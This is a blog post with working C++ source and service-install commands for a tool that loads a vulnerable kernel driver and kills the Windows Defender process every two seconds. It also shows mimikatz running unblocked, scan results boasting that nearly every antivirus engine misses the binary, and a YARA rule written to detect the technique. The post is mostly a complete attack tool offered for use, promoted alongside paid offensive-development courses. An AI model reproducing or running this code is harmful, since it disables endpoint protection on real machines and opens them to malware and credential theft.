# https://medium.com/@s12deff/weaponizing-byovd-to-kill-and-evade-windows-defender-535ad94652b0

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fweaponizing-byovd-to-kill-and-evade-windows-defender-535ad94652b0&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fweaponizing-byovd-to-kill-and-evade-windows-defender-535ad94652b0&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# Weaponizing BYOVD to Kill and Evade Windows Defender

[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:32:32/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---byline--535ad94652b0---------------------------------------)

[S12 - 0x12Dark Development](https://medium.com/@s12deff?source=post_page---byline--535ad94652b0---------------------------------------)

Follow

8 min read

·

Apr 2, 2026

6

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D535ad94652b0&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fweaponizing-byovd-to-kill-and-evade-windows-defender-535ad94652b0&source=---header_actions--535ad94652b0---------------------post_audio_button------------------)

Share

Welcome to this new Medium post, in which we look at the **_terminate process via Bring Your Own Vulnerable Driver_** _(BYOVD)_ technique. This method uses legitimate but vulnerable drivers that exposes a arbitrary process termination.

In this post, we focus on how these drivers can be used to target and terminate Windows Defender process ( **MsMpEng.exe**). This post is just the continuation of this one:

[**Arbitrary Process Termination via Vulnerable Driver: BYOVD** \\
\\
**Welcome to this new Medium post. This one is special to me because it’s the first time I’m publicly releasing a BYOVD…**\\
\\
medium.com](https://medium.com/@s12deff/arbitrary-process-termination-via-vulnerable-driver-byovd-7451cd059a66?source=post_page-----535ad94652b0---------------------------------------)

So, we will use the same vulnerable driver as in the previous post, and follow the same logic. The only difference is that we place the process-killing routine inside a loop.

**What does this mean?** We continuously try to terminate the Windows Defender process every 2 seconds. By doing this, even if the process is restarted by the system, it will be killed again almost immediately, making detection and remediation of the Windows Defender completely ineffective.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*oei677ILIkF2gjApiskmZw.png)

**Courses:** Learn how offensive development works on Windows OS from beginner to advanced taking our courses, all explained in C++.

[**All Courses** \\
\\
**Learn how real Windows offensive development works**\\
\\
0x12darkdev.net](https://0x12darkdev.net/courses/?origin=medium&source=post_page-----535ad94652b0---------------------------------------)

**Technique Database:** Access 70+ real offensive techniques with weekly updates, complete with code, PoCs, and AV scan results:

[**Malware Techniques Database** \\
\\
**Explore an ever-growing collection of techniques**\\
\\
0x12darkdev.net](https://0x12darkdev.net/techniques/?source=post_page-----535ad94652b0---------------------------------------)

**Modules**: Dive deep into essential offensive topics with our modular **text-training** program! Get a new module every 14 days. Start at just **$1.99 per module**, or unlock **lifetime access to all modules for $100**.

[**0x12 Dark Development** \\
\\
**Learn the best offensive techniques for Windows OS, with content ranging from beginner to advanced levels. All…**\\
\\
0x12darkdev.net](https://0x12darkdev.net/modules?source=post_page-----535ad94652b0---------------------------------------)

## Methodology

To achieve the **Windows Defender evasion**, we need to follow these logical steps:

1. Load and open the vulnerable driver
2. Start the while loop, for each iteration we get the **Process ID** of the **MsMpEng.exe**
3. If the process exists, we send a **IOCTL** control code with the Process ID as the parameter to **kill the process**

## Implementation

Now, let’s look at how to translate that logic into C++ code. I have broken down the most important parts.

### Load and open the vulnerable driver

We start loading and starting the driver (Administrator rights):

```
sc create terminate binpath="C:\Users\s12de\Documents\Github\evasion\Techniques\TerminateProcessBYOVD\ProcessMonitorDriver.sys" type="kernel"
[SC] CreateService SUCCESS

C:\Windows\System32>sc start terminate

SERVICE_NAME: terminate
        TYPE               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 0
        FLAGS              :
```

And in the code:

```
int main(){
 HANDLE hDevice = INVALID_HANDLE_VALUE;

 hDevice = CreateFileA("\\\\.\\STProcessMonitorDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 if (hDevice == INVALID_HANDLE_VALUE)
 {
  printf("Failed to open device: %d\n", GetLastError());
  return 1;
 }
 else {
  printf("Device opened successfully.\n");
 }
```

### Get Process ID

Then we start the while loop and we try to get the Process ID for the Windows Defender process:

```
while (true) {
 UINT64 windefPID = getPIDbyProcName("MsMpEng.exe"); // Replace with the current process name you want to terminate
 if (windefPID == 0) {
  printf("Windows Defender process not found\n");
  Sleep(2000);
  continue;
 }
```

### Kill Process

And if the process exists, we just send the IOCTL request to terminate the process:

```
DWORD bytesReturned;
BOOL result = DeviceIoControl(hDevice, IOCTL_KILL_PROCESS, &windefPID, sizeof(windefPID), NULL, 0, &bytesReturned, NULL);
if (result) {
 printf("Process with PID %d has been terminated successfully.\n", windefPID);
}
else {
 printf("Failed to terminate process with PID %d: %d\n", windefPID, GetLastError());
}
```

## Code

```
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

#define IOCTL_KILL_PROCESS 0xB822200C

// https://github.com/DeathShotXD/0xKern3lCrush-Foreverday-BYOVD-CVE-2026-0828

int getPIDbyProcName(const std::string& procName) {
 int pid = 0;
 HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 if (hSnap == INVALID_HANDLE_VALUE) {
  return 0;
 }
 PROCESSENTRY32W pe32;
 pe32.dwSize = sizeof(PROCESSENTRY32W);
 if (Process32FirstW(hSnap, &pe32) != FALSE) {
  std::wstring wideProcName(procName.begin(), procName.end());
  do {
   if (_wcsicmp(pe32.szExeFile, wideProcName.c_str()) == 0) {
    pid = pe32.th32ProcessID;
    break;
   }
  } while (Process32NextW(hSnap, &pe32) != FALSE);
 }

 CloseHandle(hSnap);
 return pid;
}

int main(){
 HANDLE hDevice = INVALID_HANDLE_VALUE;

 hDevice = CreateFileA("\\\\.\\STProcessMonitorDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 if (hDevice == INVALID_HANDLE_VALUE)
 {
  printf("Failed to open device: %d\n", GetLastError());
  return 1;
 }
 else {
  printf("Device opened successfully.\n");
 }
 while (true) {
  UINT64 windefPID = getPIDbyProcName("MsMpEng.exe"); // Replace with the current process name you want to terminate
  if (windefPID == 0) {
   printf("Windows Defender process not found\n");
   Sleep(2000);
   continue;
  }

  DWORD bytesReturned;
  BOOL result = DeviceIoControl(hDevice, IOCTL_KILL_PROCESS, &windefPID, sizeof(windefPID), NULL, 0, &bytesReturned, NULL);
  if (result) {
   printf("Process with PID %d has been terminated successfully.\n", windefPID);
  }
  else {
   printf("Failed to terminate process with PID %d: %d\n", windefPID, GetLastError());
  }
  Sleep(2000);
 }
}
```

## Proof of Concept

**Windows 11:**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*5XHuXa6bfolOo-Q91rRPEg.png)

If we try to execute the mimikatz:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*hMHRnMsL_KI47vN0Xi31Ag.png)

It’s bypassing the Windows Defender

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*P2dL8IIMu148LO4RCPj1eA.png)

> ❌ The threat service has stopped. Restart it now.

## Detection

Now it’s time to see if the defenses are detecting this as a malicious threat

### Kleenscan API

```
[*] Antivirus Scan Results:

  - alyac                | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - amiti                | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - arcabit              | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - avast                | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - avg                  | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - avira                | Status: scanning   | Flag: Scanning results incomplete    | Updated: 2026-03-31
  - bullguard            | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - clamav               | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - comodolinux          | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - crowdstrike          | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - drweb                | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - emsisoft             | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - escan                | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - fprot                | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - fsecure              | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - gdata                | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - ikarus               | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - immunet              | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - kaspersky            | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - maxsecure            | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - mcafee               | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - microsoftdefender    | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - nano                 | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - nod32                | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - norman               | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - secureageapex        | Status: ok         | Flag: Malicious                      | Updated: 2026-03-31
  - seqrite              | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - sophos               | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - threatdown           | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - trendmicro           | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - vba32                | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - virusfighter         | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - xvirus               | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - zillya               | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - zonealarm            | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
  - zoner                | Status: ok         | Flag: Undetected                     | Updated: 2026-03-31
```

### Litterbox

Static Analysis:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*ykrCdLRxMJwh0Kap53wExg.png)

### ThreatCheck

```
ThreatCheck.exe -f Z:\BYOVDWindowsDefenderKiller.exe
[+] No threat found!
[*] Run time: 0.43s
```

### Windows Defender

Bypassed

### Elastic EDR

The situation here is different, elastic works alongside Windows defender, so both processes are running in the machine, in this case we are just trying to kill the Windows Defender

## Get S12 - 0x12Dark Development’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

The execution it’s not blocked. And even with the elastic agent working we can constantly kill the Windows Defender process.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*85gQi7GhAjxuZXMPK5tXcA.png)

Elastic Logs:

```
The Microsoft Defender Antivirus Service service terminated unexpectedly.
It has done this 12 time(s).  The following corrective action will be taken
in 60000 milliseconds: Restart the service.
```

No more related logs, (just the same for the 12 times) but I don’t even find the driver loaded as service event.

### Kaspersky Free AV

Evading Kasperky

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Dz-1oxHWIEOsvdej9TONNg.png)

### Bitdefender Free AV

Evading BitDefender

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*OtpDxblTTP_pS-I96Nu-tQ.png)

### YARA

Here a YARA rule to detect this technique:

```
rule BYOVD_Defender_Killer_Generic {
    meta:
        description = "Detects tools using BYOVD techniques to terminate Windows Defender processes"
        author = "0x12 Dark Development"
        date = "2026-04-01"
        technique = "T1068 - Exploitation for Privilege Escalation"
        reference = "CVE-2026-0828"
        severity = "Critical"

    strings:
        // Target process name
        $target = "MsMpEng.exe" wide ascii

        // Device name used by the vulnerable STProcessMonitor driver
        $device = "\\\\.\\STProcessMonitorDriver" wide ascii

        // IOCTL code: 0xB822200C (Little-endian: 0C 20 22 B8)
        $ioctl_code = { 0C 20 22 B8 }

        // Process enumeration strings often used in conjunction
        $api1 = "CreateToolhelp32Snapshot"
        $api2 = "Process32FirstW"
        $api3 = "Process32NextW"
        $api4 = "DeviceIoControl"

    condition:
        uint16(0) == 0x5A4D and (
            // Match the specific IOCTL and the Device path
            ($ioctl_code and $device) or

            // Or match the device path and the intent to kill Defender
            ($device and $target) or

            // Or look for the combination of the IOCTL and process enumeration
            ($ioctl_code and $target and 2 of ($api*))
        )
}
```

Here you have my collection of YARA rules:

[**GitHub — S12cybersecurity/YaraRules: Collection of interesting Yara Rules** \\
\\
**Collection of interesting Yara Rules. Contribute to S12cybersecurity/YaraRules development by creating an account on…**\\
\\
github.com](https://github.com/S12cybersecurity/YaraRules?source=post_page-----535ad94652b0---------------------------------------)

## Conclusions

By weaponizing a vulnerable driver to continuously terminate Windows Defender in a loop, we’ve demonstrated that a trusted, signed driver can become a persistent blind spot

**📌 Follow me:** [YouTube](https://www.youtube.com/@0x12darkdev) \| 🐦 [X](https://x.com/Salsa12__) \| 💬 [Discord Server](https://discord.gg/K2HqYuj5Tv) \| 📸 [Instagram](https://www.instagram.com/malwaredevs12) \| [Newsletter](https://0x12darkdevelopmentnewsletter.eo.page/q41nr)

We help security teams enhance offensive capabilities with precision-built tooling and expert guidance, from custom implants to advanced evasion strategies

[**Offensive Development Consultant** \\
\\
**We developed specialized offensive implants for security professionals**\\
\\
0x12darkdev.net](https://0x12darkdev.net/offensive-development-services/?source=post_page-----535ad94652b0---------------------------------------)

**S12.**

[Malware](https://medium.com/tag/malware?source=post_page-----535ad94652b0---------------------------------------)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----535ad94652b0---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----535ad94652b0---------------------------------------)

[Pentesting](https://medium.com/tag/pentesting?source=post_page-----535ad94652b0---------------------------------------)

[Infosec](https://medium.com/tag/infosec?source=post_page-----535ad94652b0---------------------------------------)

[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:48:48/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---post_author_info--535ad94652b0---------------------------------------)

[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:64:64/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---post_author_info--535ad94652b0---------------------------------------)

Follow

[**Written by S12 - 0x12Dark Development**](https://medium.com/@s12deff?source=post_page---post_author_info--535ad94652b0---------------------------------------)

[4.1K followers](https://medium.com/@s12deff/followers?source=post_page---post_author_info--535ad94652b0---------------------------------------)

· [51 following](https://medium.com/@s12deff/following?source=post_page---post_author_info--535ad94652b0---------------------------------------)

Red Team Enthusiast [https://0x12darkdev.net/](https://0x12darkdev.net/)

Follow

## No responses yet

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fweaponizing-byovd-to-kill-and-evade-windows-defender-535ad94652b0&source=---post_responses--535ad94652b0---------------------respond_sidebar------------------)

Cancel

Respond

[Help](https://help.medium.com/hc/en-us?source=post_page-----535ad94652b0---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----535ad94652b0---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----535ad94652b0---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----535ad94652b0---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----535ad94652b0---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----535ad94652b0---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----535ad94652b0---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----535ad94652b0---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----535ad94652b0---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

protected by **reCAPTCHA**